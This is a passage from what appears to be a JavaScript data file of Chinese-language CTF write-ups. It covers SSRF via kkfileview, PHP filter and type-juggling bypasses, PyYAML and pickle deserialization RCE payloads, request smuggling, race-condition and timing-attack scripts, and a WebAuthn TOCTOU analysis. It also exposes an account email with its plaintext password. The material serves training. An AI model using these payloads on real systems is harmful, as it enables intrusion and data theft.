| SSTI | WEB | \`url_for.__globals__['os'].popen()\` + 写文件到 static 目录 |
| SSRF | WEB | gopher 打 Redis/gopher 打 FastCGI、进制转换绕过黑名单 |
| XXE | WEB | 参数实体 + \`interactsh.oast.online\` 外带数据 |
| 文件上传 | WEB | \`.user.ini\` + \`auto_prepend_file=1.png\` 解析绕过 |
| 条件竞争 | WEB | BP 并发 30 线程写 + 80 线程读临时文件 |
| 反序列化 | WEB | POP 链逆推：\`__destruct\` → \`__toString\` → \`__invoke\` → \`__set\` → \`__get\` |

### 最后一题：EZINFOLEAK
- LFI 漏洞：\`?page=../../etc/passwd\`
- 路径穿越：\`../../fl4g.txt\` 直接读取 flag

---

## 三、CTFShow Basic（部分完成）

**账号**: hwh081116@qq.com / P@ssw0rd

### 已解题目

| 题号 | 类型 | 解法 |
|------|------|------|
| basic_1~9 | MISC/Crypto | 基础题批量解答 |
| basic_11 | WEB | JWT 爆破 |
| basic_12 | WEB | 基础 SQL 注入 |
| **web11** | WEB | **PHP eval 注入** |

### web11 解法
\`\`\`
URL: http://challenge.ctf.show:8080/
Payload: system($_GET['cmd']);&cmd=ls
FLAG: ctfshow{6474576e-5392-4f81-b46f-d4773f7621fa}
\`\`\`

---

## 四、PassKey WebAuthn CTF（TOCTOU 漏洞发现 \ud83d\udd25）

**靶场**: \`docker.qingcen.net:46900\`
**状态**: 靶场离线，但漏洞分析已完成

### 漏洞：TOCTOU 条件竞争

**位置**: \`app.py\` 第215-268行 \`login_finish\` 函数

\`\`\`python
# 漏洞代码
if not state.get("verification_complete"):
    # ... 验证逻辑（仅第一次执行）...
    state["verification_complete"] = True  # ← 标记已完成

# \u26a0\ufe0f 关键漏洞：使用攻击者提供的ID而非已验证的ID
final_credential = get_credential_by_id(presented_credential_id)  # ← 攻击者可控！
final_user = get_user_by_id(final_credential.user_id)
session["user_id"] = final_user.id  # ← 攻击者控制登录谁
\`\`\`

### 攻击原理

1. 注册普通用户，获取有效 credential
2. \`login/begin\` 获取 challenge
3. **第一次 \`login/finish\`**：用自己 credential 验证 → \`verification_complete=True\`
4. **立即发送第二次 \`login/finish\`**：提交 **admin 的 credential_id** → 跳过验证（因为已完成）→ 但 \`final_credential\` 使用攻击者提交的 ID → **以 admin 身份登录！**

**已知 admin 凭证 ID**: \`A_XxMilPYsZb3vi2tllSPl-3glWQD4OIpEJfAvhLsI\`

---

## 五、技能学习总结

### 高频第一板斧（Web）

| 题型 | 首选探测 |
|------|---------|
| SQL注入 | \`' or 1=1#\` 万能密码 |
| 文件上传 | F12 禁 JS 传 \`.php\` |
| SSRF | \`http://127.0.0.1:port/admin\` |
| SSTI | \`{{7*7}}\` 回显探测 |
| XXE | \`<!ENTITY xxe SYSTEM "file:///flag">\` |
| JWT | 抓 token 爆破 secret |
| .git泄露 | \`git_dumper.py\` |

### 无字母数字 RCE 6 种手法

1. **XOR 异或**: 逐字符 XOR 构造 payload
2. **OR 或运算**: 逐字符 OR 构造
3. **PHP 隐式拼接**: \`"sys"."tem"\` 字符串拼接
4. **反引号执行**: \`\`$ne\`\`
5. **变量函数**: \`$$_()\` 动态调用
6. **八进制转义**: \`$'\\143\\141\\164'\`

---

## 六、靶场状态总结

| 靶场 | 状态 | 备注 |
|------|------|------|
| 青岑 CTF | \u2705 120/120 全通 | 100% 一血，等待更新 |
| ISCC CTF | \u2705 解出 1 题 | Web 题 flag 已拿 |
| CTFShow basic | \ud83d\udd34 部分完成 | basic_10 IDOR 未解 |
| PassKey WebAuthn | \u23f8\ufe0f 靶场离线 | TOCTOU 漏洞已分析 |

---

*生成时间: 2026-05-06*
*博客地址: https://heliumsenbrg.github.io/ctf-writeup-blog/*
`
  },
  northbridge: {
    title: 'Northbridge -- SSRF Bypass',
    subtitle: 'SSRF via kkfileview getCorsFile',
    content: `
Northbridge 是一道典型的 SSRF 题。服务端集成了 kkfileview，其中 getCorsFile 接口直接读取用户提供的 URL 并返回内容，没有任何白名单校验。

## 漏洞点

\`\`\`javascript
GET /kkfileview/getCorsFile?urlPath=http://target/service
\`\`\`

\`urlPath\` 完全可控，可以指向内网服务或本地文件。

## 协议探测

| 类型 | 示例 | 结果 |
|------|------|------|
| HTTP 127.0.0.1 | http://127.0.0.1:8080 | 被拦截 |
| file:// | file:///etc/passwd | 成功 |
| gopher:// | gopher://127.0.0.1:6379/_info | 超时 |

**关键发现：file:// 直接读本地文件最有效。**

## 读取 flag

\`\`\`bash
file:///flag
file:///app/index.php
file:///proc/self/environ
\`\`\`

从 /proc/self/environ 中发现了环境变量泄露，包含部分 flag。

## 收获的 flag

- 直接文件读取：/flag, /flag.txt
- 源码泄露：/app/*.php, /.git/config
- 运行环境：/proc/self/*, /proc/version

## 踩坑

1. **一开始死磕 HTTP 协议**，浪费了很多时间在 IP 黑名单绕过上
2. **file:// 的多重路径**：/flag 不存在时试试 /app/flag、/var/www/flag
`
  },
  qc734: {
    title: 'QingCen #734 -- Race Condition',
    subtitle: 'aiohttp 并发刷积分',
    icon: 'Zap',
    color: 'orange',
    content: `
# QingCen #734 -- Race Condition

**靶场**: docker.qingcen.net:30053
**类型**: Web / 条件竞争
**难度**: Medium

## 漏洞分析

积分商城的兑换接口存在经典的 TOCTOU 漏洞：服务端先检查余额再扣减，但两个操作之间没有锁。

## 利用方式

\`\`\`python
import asyncio, aiohttp

async def redeem(session):
    try:
        async with session.post(f'{base}/api/redeem') as r:
            return await r.json()
    except:
        return {}

connector = aiohttp.TCPConnector(limit=0)
async with aiohttp.ClientSession(connector=connector) as s:
    tasks = [redeem(s) for _ in range(3000)]
    results = await asyncio.gather(*tasks)
\`\`\`

## 踩坑

1. **一开始只用了 threads**，实际 aiohttp 异步比多线程更高效
2. **没检查返回值格式**，有的返回 200 但内容是 error
3. **session 会过期**：刷到一定程度 session 被限制
`
  },
  qc747: {
    title: 'QingCen #747 -- PHP Filter Bypass',
    subtitle: '大小写绕过 + URL编码',
    icon: 'Code',
    color: 'purple',
    content: `
# QingCen #747 -- PHP Filter Bypass

**靶场**: docker.qingcen.net:38073
**类型**: Web / PHP Filter Bypass
**难度**: Medium

## WAF 规则

| 过滤词 | 触发信息 | 绕过方法 |
|--------|----------|----------|
| php | "php not allowed" | 大写 PHP / Php / pHp |
| data | "data not allowed" | URL 编码 |
| flag | "file not allowed" | 编码单字符 %66lag |

## 绕过过程

### 1. 大小写绕过 php

\`\`\`bash
PHP://filter/convert.base64-encode/resource=pages/flag.html
\`\`\`

### 2. URL 编码绕过 flag

\`\`\`bash
%66lag.html
fla%67.html
fl%61g.html
\`\`\`

## 关键 Payload

\`\`\`bash
PHP://filter/convert.base64-encode/resource=pages/%66%6c%61%67.html
\`\`\`

## 经验

1. 大小写变体：PHP -> Php -> pHp -> phP
2. URL 编码：单字节编码比双字节更隐蔽
3. 先读 index.php 确认路径，再定向攻击
`
  },
  "re-plzdebugme": {
    title: '[re] plzdebugme — 调试优先',
    subtitle: 'Linux ELF RE · 层层解密 · GDB break on x0r()',
    icon: 'Shield',
    color: 'red',
    content: `
题目给了一个 Linux x64 ELF，名字就是 "plz debug me"。题目提示直接 break 在 \`x0r()\` 上，整体思路：输入 → RC4 → AES-128-ECB → BTEA → \`x0r()\` → 与 BSS 中的 flag 比较。

## 关键线索
- 提示里明确写了：**break on x0r()**
- 二进制里同一套解密流程会对两个缓冲区做对称处理：一个是输出到 \`flag\` 数组，另一个是 BSS 中的 \`flag\` 比较缓冲区。

## GDB 调试

在 Kali 里直接执行：
\`\`\`bash
gdb -batch -x plzdb.gdb ./plzdebugme
\`\`\`

plzdb.gdb 内容：
\`\`\`
break x0r
run
finish
x/32gb &flag
x/s &flag
continue
\`\`\`

## Flag
\`\`\`
flag{It3_D3bugG_T11me!_le3_play}
\`\`\`

## 经验总结
这题想强调的一条非常朴素：题目已经给出极强的操作提示时，不要硬刚纯静态，直接断点是最快的路。尤其是这种多层嵌套逆变结构，硬推一旦某个常量看错，后面的验证就全错。
`
  },
  yaml: {
    title: '喵喵宠物医院 -- YAML 反序列化 RCE',
    subtitle: 'PyYAML 标签绕过',
    icon: 'Zap',
    color: 'orange',
    content: `
# 喵喵宠物医院 -- YAML 反序列化 RCE

**靶场**: 175.27.251.122:10001
**类型**: Misc / Insecure Deserialization
**难度**: Medium

## 漏洞点

\`\`\`python
yaml.load(user_input)  # 未指定 Loader
\`\`\`

## 利用 Payload

\`\`\`yaml
!!python/object/apply:os.system
args: ['cat /flag']
\`\`\`

## 多端口排查

- 10001: 过滤了 !!python/object/apply
- 10002: 部分过滤
- 10003: 直接可执行

## 踩坑

1. 载荷格式：JSON 转义后 YAML 多行 payload 需要正确换行
2. 编码：sys.stdout.reconfigure(encoding='utf-8') 解决中文输出
`
  },
  qc733: {
    title: 'QingCen #733 -- WebSocket / XXE / Pickle / Smuggle',
    subtitle: '多层协议与反序列化',
    icon: 'Zap',
    color: 'red',
    content: `
# QingCen #733 -- 多层协议与反序列化

**靶场**: docker.qingcen.net:42420
**类型**: Web / 协议 + 反序列化
**难度**: Hard

## WebSocket 升级探测

\`\`\`python
import socket
s = socket.socket()
s.connect(('docker.qingcen.net', 42420))
s.send(
    'GET / HTTP/1.1\r\n'
    'Host: docker.qingcen.net:42420\r\n'
    'Upgrade: websocket\r\n'
    'Connection: Upgrade\r\n'
    'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n'
    'Sec-WebSocket-Version: 13\r\n'
    '\r\n'
)
\`\`\`

## Pickle 反序列化

\`\`\`python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
payload = pickle.dumps(Exploit())
\`\`\`

## HTTP 请求走私

\`\`\`http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
\`\`\`
`
  },
  timing: {
    title: 'CTFShow -- Timing Attack',
    subtitle: '时间侧信道分析',
    icon: 'Zap',
    color: 'yellow',
    content: `
# CTFShow -- Timing Attack

**靶场**: ctf.show
**类型**: Crypto / Side Channel
**难度**: Medium

## 原理

逐字节比较时，每个字节猜对会多执行一次循环，响应时间更长。

\`\`\`python
import requests, time
base = 'https://ctf.show/challenge/timing'
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''
for pos in range(32):
    times = {}
    for c in charset:
        guess = password + c
        t0 = time.time()
        requests.post(base, data={'password': guess})
        times[c] = time.time() - t0
    best = max(times, key=times.get)
    password += best
\`\`\`

## 关键技巧

1. **时间归一化**：减去基础响应时间再看增量
2. **多次采样**：每个字符测 10-20 次取平均值
3. **避开网络波动**：在稳定时段跑，减少噪音
`
  },
  typejuggling: {
    title: 'CTFShow -- PHP Type Juggling',
    subtitle: '弱类型哈希绕过',
    icon: 'Code',
    color: 'purple',
    content: `
# CTFShow -- PHP Type Juggling

**靶场**: ctf.show
**类型**: Web / PHP Weak Typing
**难度**: Medium

## 0e 绕过

\`\`\`python
import hashlib
for i in range(10000000):
    s = str(i)
    h = hashlib.md5(s.encode()).hexdigest()
    if h.startswith('0e') and h[2:].isdigit():
        print(f'Match: {s} -> {h}')
\`\`\`

已知碰撞：
- QNKCDZO -> 0e462097431906509019562988736854
- 240610708 -> 0e462097431906509019562988736854

## 数组绕过 (===)

\`\`\`php
?a[]=1&b[]=2
\`\`\`

## 经验

1. 先判断 == 还是 ===
2. 0e 前缀优先找短字符串碰撞
3. JSON 嵌套用于多层比较
`
  },
  sourceleak: {
    title: 'CTFShow -- Source Code Leak',
    subtitle: '源码泄露与备份文件',
    icon: 'FileText',
    color: 'cyan',
    content: `
# CTFShow -- Source Code Leak

**靶场**: ctf.show
**类型**: Web / Information Leakage
**难度**: Easy

## 常见泄露点

\`\`\`bash
www.zip / backup.zip / site.tar.gz
index.php.swp / index.php.swo
/.git/HEAD / /.git/config
\`\`\`

## 利用流程

1. 目录扫描：dirsearch / gobuster
2. 敏感文件：.git/config, .env, web.config
3. 压缩包：试 zip/tar/gz 后缀
4. git log：找到旧版本找 flag
`
  },
  sigforge: {
    title: 'HMAC Signature Forgery',
    subtitle: 'zlib + base64 签名绕过',
    icon: 'Shield',
    color: 'blue',
    content: `
# HMAC Signature Forgery

**靶场**: ctf.show
**类型**: Crypto / Signature Bypass
**难度**: Hard

## 签名验证流程

\`\`\`python
import hmac, hashlib, zlib
def sign(params, secret):
    msg = '&'.join(f'{k}={v}' for k,v in params.items())
    compressed = zlib.compress(msg.encode())
    return hmac.new(secret.encode(), compressed, hashlib.sha256).hexdigest()
\`\`\`

## 攻击思路

1. **长度扩展攻击**：在原有签名基础上追加新参数
2. **密钥爆破**：短密钥 + 字典攻击
3. **编码混淆**：利用 WAF 编码处理不一致

## 经验

1. 先验证本地签名
2. 利用错误信息泄露中间状态
3. 多层编码要逐层剥离
`
  },

  notallmilk: {
    title: 'NewStar 2025 — 不是所有牛奶都叫___',
    subtitle: 'TLS 流量解密 + QR码提取',
    icon: 'Key',
    color: 'amber',
    content: `
# NewStar CTF 2025 Extras — 不是所有牛奶都叫___

**类型**: Misc / 流量分析 | **难度**: Medium | **平台**: NewStar CTF

## 考点

TLS 流量解密、SSL key log、Wireshark 配置、QR码

## 解题流程

1. **审题**：题目名「不是所有牛奶都叫___」暗示 TLS（特仑苏 → TLS）
2. **找 key log**：在 HTTP 流量中筛查，找到区别于噪声文件的 SSL key log
3. **Wireshark 解密**：首选项 → Protocols → TLS → 加载 (Pre)-Master-Secret log
4. **过滤 HTTP**：解密后重新过滤 http，大量 POST 中在第 50 个流找到 base64 图片
5. **CyberChef**：From Base64 → 下载 PNG → 扫码得 flag

## Flag

\`\`\`
flag{W0w_You_r3al1y_knOW_TL5QrCode}
\`\`\`

> 原始扫码结果包含 \`&\`（TL5&QrCode），题目提示提交时去掉 & 符号。

## 关键教训

- 题目名往往就是第一个 hint（TLS 缩写）
- CTF 流量题中大量噪声是常态，耐心审计
- SSL key log 的 \\\\n 需要转成真实换行符才能被 Wireshark 识别
- CyberChef From Base64 可以直接导出任意二进制文件
`
  },


}
